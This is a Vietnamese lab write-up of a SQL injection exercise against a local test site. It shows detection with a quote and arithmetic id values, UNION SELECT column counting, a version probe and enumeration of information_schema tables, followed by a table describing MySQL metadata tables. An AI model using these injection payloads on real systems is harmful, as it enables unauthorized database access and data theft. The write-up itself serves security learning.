### Người thực hiện: Trần Ngọc Nam
### Thời gian thực hiện: 30/03/2022

# Cách làm:
- Check xem web có bị lỗi sql injection không? SQL có 2 dạng để check: dựa trên số(?id=1) hoặc dạng chuỗi(string). Nhưng dựa theo cấu trúc web nên ta chọn check theo id.
  - Đầu tiên, ta thử chèn dấu ' vào http://192.168.216.129/cat.php?id=1
  ```php
    Thanh URL sẽ có dạng: http://192.168.216.129/cat.php?id=1'

    Kết quả trả về:
    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
  ```
  - Điều này chưa kết luận được web có lỗi sql injection không. Nên ta tiếp thực thử truyền phép tính vào url
  ```php
    Thanh URL sẽ có dạng: http://192.168.216.129/cat.php?id=2-1
  ```
  - Kết quả trả về là trang http://192.168.216.129/cat.php?id=1. Chứng tỏ web có thể lỗi sql injection.
  - Ta thực hiện thêm 1 lần truyền phép tính vào thanh url
  ```php
    Thanh URL sẽ có dạng: http://192.168.216.129/cat.php?id=3-2
  ```
  - Kết quả trả về vẫn là trang http://192.168.216.129/cat.php?id=1. Chứng tỏ web đã lỗi sql injection.

- Tiếp theo, ta check số cột của database bằng toán tử union. Ta check số lượng từ 1 và tăng dần
  ```php
    http://192.168.216.129/cat.php?id=1 union select 1
    http://192.168.216.129/cat.php?id=1 union select 1,2
    http://192.168.216.129/cat.php?id=1 union select 1,2,3
    http://192.168.216.129/cat.php?id=1 union select 1,2,3,4
  ```
- Ta nhận thấy số cột là 4 khi thử đến lần thứ 4 trang web trả về tất cả iteam trong trang web
- Ta nhận thấy số cột là 4 khi thử đến lần thứ 4 trang web trả về tất cả iteam trong trang web
  ```php
  http://192.168.216.129/cat.php?id=1 union select 1,@@version,3,4

  Kết quả trả về: 5.1.63-0+squeeze1
  ```
- Tiếp theo, ta check tên các table có trong database
  ```php
  http://192.168.216.129/cat.php?id=1 union select 1,table_name,3,4 from information_schema.tables
  ``` 
- Kết quả trả về gồm rất nhiều table như sau:
| No. | Table                                 | Description                                                                                                                                                                    |
| --- | ------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 1   | CHARACTER_SETS                        | Cung cấp thông tin về các character set(bộ ký tự) hiện có.                                                                                                                     |
| 2   | COLLATIONS                            | Cung cấp thông tin về các collation(đối chiếu) của từng character set.                                                                                                         |
| 3   | COLLATION_CHARACTER_SET_APPLICABILITY | Cho biết character set nào có thể áp dụng cho collation nào.                                                                                                                   |
| 4   | COLUMNS                               | Cung cấp thông tin về các column trong các table.                                                                                                                              |
| 5   | COLUMN_PRIVILEGES                     | Cung cấp thông tin phân quyền trên các column.                                                                                                                                 |
| 6   | COLUMN_STATISTICS                     | Cung cấp thông tin truy cập đến các thống kê biểu đồ cho các giá trị của column.                                                                                               |
| 7   | ENGINES                               | Cung cấp thông tin về các storage engine(Công cụ lưu trữ), rất hữu dụng trong việc kiểm tra xem storage engine nào đang được hỗ trợ, và storage engine mặc định là engine nào. |
| 8   | EVENTS                                | Cung cấp thông tin về các sự kiện trong Event Manager.                                                                                                                         |
| 9   | FILES                                 | Cung cấp thông tin về các file nơi dữ liệu không gian bảng của MySQL được lưu trữ. Cung cấp thông tin về các tập tin dữ liệu của InnoDB.                                       |
| 10  | KEY_COLUMN_USAGE                      | Mô tả các column là khóa (key) của table. Table này không cung cấp thông tin về các thành phần khóa mà chỉ cung cấp thông tin về column.                                       |
| 11  | KEYWORDS                              | Liệt kê các từ được xem là keyword trong MySQL.                                                                                                                                |
| 12  | OPTIMIZER_TRACE                       | Cung cấp thông tin được tạo bởi khả năng theo dõi của trình tối ưu hóa cho các câu lệnh được theo dõi. Để bật chức năng theo dõi, sử dụng biến hệ thống optimizer_trace.       |
| 13  | PARAMETERS                            | Cung cấp thông tin về các parameter cho các stored procedure và stored function, và giá trị trả về cho các stored function.                                                    |
| 14  | PARTITIONS                            | Cung cấp thông tin về các phân vùng (partition) của table. Mỗi row trong table này ứng với 1 phân vùng cụ thể hay phân vùng phụ (subpartition) của 1 table.                    |
| 15  | PLUGINS                               | Cung cấp thông tin về các plugin của server.                                                                                                                                   |
| 16  | PROCESSLIST                           | Cung cấp thông tin về thread đang chạy.                                                                                                                                        |
| 17  | PROFILING                             | Cung cấp thông tin hồ sơ của các lệnh trong MySQL. Cung cấp thông tin chỉ ra việc sử dụng tài nguyên cho các lệnh được thực thi trong suốt quá trình của session hiện tại.     |
| 18  | REFERENTIAL_CONSTRAINTS               | Cung cấp thông tin về các khóa ngoại (foreign key).                                                                                                                            |
| 19  | RESOURCE_GROUPS                       | Cung cấp truy cập đến thông tin về các nhóm tài nguyên (resource group) trong MySQL.                                                                                           |
| 20  | ROUTINES                              | Cung cấp thông tin về các stored procedure và function.                                                                                                                        |
| 21  | SCHEMATA                              | Cung cấp thông tin về các database.                                                                                                                                            |
| 22  | SCHEMA_PRIVILEGES                     | Cung cấp thông tin phân quyền của các database.                                                                                                                                |
| 23  | STATISTICS                            | Cung cấp thông tin về các chỉ mục (index) của table.                                                                                                                           |
| 24  | ST_GEOMETRY_COLUMNS                   | Cung cấp thông tin về các column lưu trữ dữ liệu không gian (spatial data).                                                                                                    |
| 25  | ST_SPATIAL_REFERENCE_SYSTEMS          | Cung cấp thông tin các hệ thống tham chiếu có sẵn cho dữ liệu không gian.                                                                                                      |
| 26  | ST_UNITS_OF_MEASURE                   | Cung cấp thông tin về các đơn vị (unit) được chấp nhận trong function ST_Distance().                                                                                           |
| 27  | TABLES                                | Cung cấp thông tin về các table trong các database hiện có trong server.                                                                                                       |
| 28  | TABLESPACES                           | Cung cấp thông tin về tablespace đang hoạt động của MySQL Cluster.                                                                                                             |
| 29  | TABLE_CONSTRAINTS                     | Mô tả những table nào có ràng buộc (constraint).                                                                                                                               |
| 30  | TABLE_PRIVILEGES                      | Cung cấp thông tin phân quyền của các table.                                                                                                                                   |
|     |
| 31  | TRIGGERS                              | Cung cấp thông tin về các trigger.                                                                                                                                             |
| 32  | USER_PRIVILEGES                       | Cung cấp thông tin phân quyền của toàn bộ MySQL.                                                                                                                               |
| 33  | VIEWS                                 | Cung cấp thông tin về các view trong các database.                                                                                                                             |
| 34  | VIEW_ROUTINE_USAGE                    | Cung cấp truy cập đến các thông tin về các stored function được sử dụng trong định nghĩa view.                                                                                 |
| 35  | VIEW_TABLE_USAGE                      | Cung cấp truy cập đến thông tin về các table và view được sử dụng trong định nghĩa view.                                                                                       |